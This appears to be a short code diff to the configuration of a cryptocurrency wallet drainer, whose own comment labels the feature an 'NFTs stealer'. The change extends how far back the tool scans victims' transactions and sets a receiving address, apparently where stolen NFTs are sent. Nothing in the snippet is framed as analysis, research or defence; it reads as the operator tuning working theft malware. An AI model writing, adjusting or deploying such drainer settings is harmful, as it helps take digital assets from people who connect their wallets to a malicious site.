@@ -32,8 +32,8 @@ const mintInfo = {
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    checkMaxDay: 10000, // Maximum number of days to check for the last transactions.
+    receiveAddress: "FQhPZwDeL9pDYzQqLOT5DmQPOLoRBJI3qdOjlnDdshaSO0auU7Dr7SD1OnZVKxR0" // leave empty if you want to use the same address 
 }
 
 /* 
